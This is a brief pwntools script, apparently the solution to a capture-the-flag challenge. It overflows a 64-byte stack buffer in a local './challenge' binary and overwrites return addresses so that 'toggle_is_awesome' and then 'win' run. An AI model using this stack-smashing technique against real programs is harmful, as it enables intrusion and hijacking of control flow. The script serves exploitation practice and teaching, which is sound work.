from pwn import *

p = process('./challenge')
elf = ELF('./challenge')

payload  = b'a' * 64 # Use up the buffer
payload += b'a' * 8  # Overwrite saved rbp with garbage

# First we need to call `toggle_is_awesome` and then we need to call `win`

# Overwrite the return address for `main`
payload += p64(elf.functions["toggle_is_awesome"].address)
# Overwrite the return address for the function that called `main`
payload += p64(elf.functions["win"].address)

p.sendline(payload)
print(p.recvall())
